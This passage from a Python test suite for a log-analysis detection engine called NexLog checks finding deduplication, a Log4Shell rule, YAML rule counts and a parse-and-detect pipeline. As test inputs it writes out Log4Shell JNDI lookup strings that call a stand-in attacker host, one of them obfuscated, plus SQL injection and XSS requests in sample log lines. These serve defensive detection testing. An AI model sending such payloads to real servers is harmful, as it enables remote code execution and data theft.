        Finding("W1","A","t",Severity.CRITICAL,0.9,"web_attack",
                source_ip="1.1.1.1",timestamp=base+timedelta(seconds=10),mitre_tags=[],
                trigger_line="line-c"),
    ]
    deduped = RuleEngine.deduplicate_findings(dupes, window_secs=60)
    check("3 dupes â†’ 1 after dedup",        len(deduped) == 1,  f"got {len(deduped)}")
    check("supporting_lines has 2 merged",  len(deduped[0].supporting_lines) == 2)

    # dedup window expiry â€” second Finding is outside window
    spread = [
        Finding("A1","C","t",Severity.MEDIUM,0.7,"auth",
                source_ip="3.3.3.3",timestamp=base,mitre_tags=[]),
        Finding("A1","C","t",Severity.MEDIUM,0.7,"auth",
                source_ip="3.3.3.3",timestamp=base+timedelta(seconds=120),mitre_tags=[]),
    ]
    deduped2 = RuleEngine.deduplicate_findings(spread, window_secs=60)
    check("spread finds outside window: both kept", len(deduped2) == 2)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 14. Log4Shell end-to-end
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_log4shell():
    print("\nâ”€â”€ 14. Log4Shell (DISC-008) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    rules_dir = os.path.join(_ROOT, "detection", "rules")
    if not os.path.exists(os.path.join(rules_dir, "discovery.yaml")):
        print("  SKIP  discovery.yaml not found"); return

    engine = RuleEngine(rules_dir)
    # DISC-008 matches http_user_agent (where Apache parser stores UA)
    for payload in [
        "${jndi:ldap://attacker.com:1389/exploit}",
        "${jndi:${lower:l}dap://attacker.com/x}",
    ]:
        ids = [f.rule_id for f in engine.evaluate(
            make_entry(source_ip="203.0.113.99", http_user_agent=payload))]
        check(f"DISC-008 fires: {payload[:40]}", "DISC-008" in ids, f"got {ids}")

    # Verify CRITICAL severity
    f_list = engine.evaluate(make_entry(source_ip="1.1.1.1",
                                        http_user_agent="${jndi:ldap://x.x/a}"))
    disc = [f for f in f_list if f.rule_id == "DISC-008"]
    if disc:
        check("Log4Shell severity is CRITICAL", disc[0].severity == Severity.CRITICAL)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 15. YAML rule count integrity
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_yaml_integrity():
    print("\nâ”€â”€ 15. YAML rule count integrity â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    import yaml
    rules_dir = os.path.join(_ROOT, "detection", "rules")
    expected = {
        "web_attacks.yaml": 13, "auth_attacks.yaml": 10,
        "persistence.yaml": 7,  "recon.yaml": 8,
        "exfiltration.yaml": 8, "malware.yaml": 10,
        "lateral_movement.yaml": 8, "living_off_land.yaml": 9,
        "bot_activity.yaml": 7, "cloud_container_attacks.yaml": 9,
        "ai_llm_attacks.yaml": 8, "api_security.yaml": 9,
        "defense_evasion.yaml": 8, "network_protocols.yaml": 7,
        "supply_chain.yaml": 8, "insider_threat.yaml": 8,
        "privilege_escalation.yaml": 9, "discovery.yaml": 8,
        "impact.yaml": 8,
    }
    total_actual = 0
    for fname, exp in sorted(expected.items()):
        fpath = os.path.join(rules_dir, fname)
        if not os.path.exists(fpath):
            check(f"{fname} exists", False); continue
        try:
            count = len(yaml.safe_load(open(fpath)).get("rules", []))
            total_actual += count
            check(f"{fname}: {count} rules",
                  count == exp, f"expected {exp}, got {count}")
        except Exception as e:
            check(f"{fname} parses", False, str(e))

    check("total == 162",
          total_actual == 162, f"got {total_actual}")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 16. Full parse + detect pipeline
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_full_pipeline():
    print("\nâ”€â”€ 16. Full pipeline (parse + detect) â”€â”€â”€â”€â”€â”€")
    core_path = os.path.join(_ROOT, "core")
    if not os.path.exists(core_path):
        print("  SKIP  core/ not found"); return
    sys.path.insert(0, core_path)
    from engine import Engine  # type: ignore

    lines = [
        '203.0.113.5 - - [04/Jan/2026:10:00:01 +0000] "GET /login.php?user=admin\'+OR+1=1-- HTTP/1.1" 200 512 "-" "sqlmap/1.7"',
        '10.0.0.5 - - [04/Jan/2026:10:00:02 +0000] "POST /upload.php HTTP/1.1" 200 2048 "-" "python-requests/2.28"',
        '1.1.1.1 - - [04/Jan/2026:10:00:03 +0000] "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 256 "-" "curl/7.0"',
    ]
    with tempfile.NamedTemporaryFile(mode="w", suffix=".log",
                                     delete=False, encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
        tmp = f.name

    try:
        parse  = Engine()
        detect = RuleEngine(os.path.join(_ROOT, "detection", "rules"))
        all_f  = []
        for entry in parse.parse(tmp):
            all_f.extend(detect.evaluate(entry))

        ids = [f.rule_id for f in all_f]
        check("findings produced",          len(all_f) > 0)
        check("WEB-001 SQLi",               "WEB-001" in ids, f"got {ids}")
        check("WEB-002 XSS",                "WEB-002" in ids, f"got {ids}")
        check("all are Finding objects",    all(isinstance(f, Finding) for f in all_f))
        check("all JSON-serialisable",      all(_json_safe(f.to_dict()) for f in all_f))
        check("sha256 chain-of-custody",    "sha256" in parse.file_meta)

        # summary extended fields present
        summary = detect.summary()
        check("summary.findings_by_category", "findings_by_category" in summary)
        check("summary.rules_by_type",        "rules_by_type" in summary)
    finally:
        os.unlink(tmp)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# main
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
if __name__ == "__main__":
    print("=" * 58)
    print("  NexLog Layer 2 â€” Complete Test Suite")
    print("=" * 58)

    test_finding_model()
    test_finding_round_trip()
    test_filter_keys()
    test_regex_matcher()
    test_threshold_matcher()
    test_sequence_exact()
    test_sequence_advanced()
    test_composite_rule()
    test_attck_tagger()
    test_risk_and_chains()
    test_rule_engine_api()
    test_engine_populates_new_fields()
    test_filter_and_dedup()
    test_log4shell()
    test_yaml_integrity()
    test_full_pipeline()

    print(f"\n{'=' * 58}")
    print(f"  Results:  {_passed} passed Â· {_failed} failed")
    print(f"{'=' * 58}")
    if _failed:
        raise SystemExit(1)
